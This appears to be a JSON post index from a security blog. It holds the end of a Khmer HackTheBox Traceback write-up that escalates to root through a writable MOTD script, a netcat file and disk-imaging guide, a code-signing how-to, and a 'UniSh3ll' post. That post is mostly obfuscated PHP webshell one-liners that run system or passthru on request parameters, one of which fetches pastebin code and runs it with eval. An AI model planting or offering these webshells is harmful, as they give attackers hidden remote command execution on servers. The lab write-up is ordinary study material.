ប្រើប្រាស់ដោយម្ចាស់គណនី root។\nក្រោយពីបានចូលទៅមើលឯកសារដែលមាននៅក្នុងថតឯកសារ /etc/update-motd.d/ រួចមកខ្ញុំសង្កេតឃើញថាឯកសារដែលមានក្នុងនោះគឺជារបស់ម្ចាស់គណនី root ប៉ុន្តែម្ចាស់គណនី sysadmin ក៏អាចមានសិទ្ធិកែប្រែបានផងដែរ។\nដូចនេះខ្ញុំក៏បន្ថែមពាក្យបញ្ជាមួយបន្ទាត់ទៀត គឺ \u0026ldquo;cat /root/root.txt\u0026rdquo; ចូលទៅក្នុងឯកសារ 00-header ដែលជាឯកសារបង្ហាញផ្ទាំងក្បាលនៅពេលចូលដល់កន្លែងវាយលេខសំងាត់របស់ SSH\nនៅពេលរួចរាល់អស់ហើយខ្ញុំបានធ្វើការសាកល្បង SSH ចូលក្នុងម៉ាស៊ីនមេម្ដងទៀតហើយក៏ទទួលបាន\u0026hellip; :D\nពិតណាស់ ដូចដែលឃើញចឹងគឺខ្ញុំទទួលបាន Root Flag នៅពេលដែលចូលក្នុងម៉ាស៊ីនមេដោយប្រើ SSH៕\n","description":"សំនេររៀបរាប់អំពីការហេគម៉ាស៊ីនមេ traceback.","id":9,"section":"posts","tags":null,"title":"HackTheBox - Traceback","uri":"https://thiklab.com/posts/traceback-10-10-10-181/"},{"content":"Hello, I\u0026rsquo;m thik and this is my blog, written about Cybersecurity topic and Malware research.\nThik\n","description":"About author of the blog","id":10,"section":"","tags":null,"title":"About","uri":"https://thiklab.com/about/"},{"content":"Netcat is like a swiss army knife for geeks. It can be used for just about anything involving TCP or UDP. One of its most practical uses is to transfer files. Non *nix people usually don\u0026rsquo;t have SSH setup, and it is much faster to transfer stuff with netcat then setup SSH. netcat is just a single executable, and works across all platforms (Windows,Mac OS X, Linux).\nOn the receiving end running,\n1  nc -l -p 1234 \u0026gt; out.file   will begin listening on port 1234.\nOn the sending end running,\n1  nc -w 3 [destination] 1234 \u0026lt; out.file   will connect to the receiver and begin sending file.\nFor faster transfers if both sender and receiver has some basic *nix tools installed, you can compress the file during sending process,\nOn the receiving end,\n1  nc -l -p 1234 | uncompress -c | tar xvfp -   On the receiving end,\n1  tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234   A much cooler but less useful use of netcat is, it can transfer an image of the whole hard drive over the wire using a command called dd.\nOn the sender end run,\n1  dd if=/dev/hda3 | gzip -9 | nc -l 3333   On the receiver end,\n1  nc [destination] 3333 | pv -b \u0026gt; hdImage.img.gz   Be warned that file transfers using netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.\nBonus ","description":"Transfers any files using netcat.","id":11,"section":"posts","tags":["netcat"],"title":"Netcat - File Transfers","uri":"https://thiklab.com/posts/netcat-file-transfers/"},{"content":"In order to use a non deprecated way to sign your own script, one should use New-SelfSignedCertificate.\nGenerate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\\CurrentUser\\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)[0] -FilePath code_signing.crt   The [0] will make this work for cases when you have more than one certificate. Obviously make the index match the certificate you want to use or use a way to filtrate (by thumprint or issuer).\nImport as Trusted Publisher 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\Root   Item Cert:\\C\nSigning Application 1  Set-AuthenticodeSignature .\\app.exe -Certificate (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)   Obviously once you have setup the key, you can simply sign any other scripts with it.\nSource: stackoverflow\n","description":"Creating certification for code signing.","id":12,"section":"posts","tags":null,"title":"Self Signed Certification","uri":"https://thiklab.com/posts/self-signed-certification/"},{"content":"USh3ll-I 1  \u0026lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system\u0026amp;0=id;ls+-la    USh3ll-II 1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\u0026#34; \u0026gt; uni.php   1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\\r\u0026lt;?=\u0026#39;404 Not found\u0026#39;;?\u0026gt;\u0026#34; \u0026gt; uni.php   Usage: curl localhost/uni.php -d _=ls+-la\nUSh3ll-III 1  \u0026lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់\u0026amp;$ា[ម]($ា[ប]); //.php?ត=true\u0026amp;ល=ស្រលាញ់\u0026amp;ម=passthru\u0026amp;ប=ls    1  \u0026lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់\u0026amp;$ា[ម]($ា[ប]); eval(\u0026#39;?\u0026gt;\u0026#39;.file_get_contents($ា[ដ]));?\u0026gt;   Usage: uni.php?ត=true\u0026amp;ល=ស្រលាញ់\u0026amp;ម=passthru\u0026amp;ប=id\u0026amp;ដ=https://pastebin.com/raw/JfLvh0MG\nUSh3ll-IV 1  \u0026lt;?=$a=\u0026#34;sy\u0026#34;;$b=\u0026#34;stem\u0026#34;;$c=$a.$b; $c(\u0026#34;uname -a\u0026#34;); //get method    USh3ll-V 1  \u0026lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v \u0026#39;127.0.0.1:8080/uni.php?0=system\u0026amp;1=la+-la\u0026#39;    ","description":"A family of atom(s) php webshell script.","id":13,"section":"posts","tags":["phpshell"],"title":"UniSh3ll Tutorial","uri":"https://thiklab.com/posts/unishell/"}]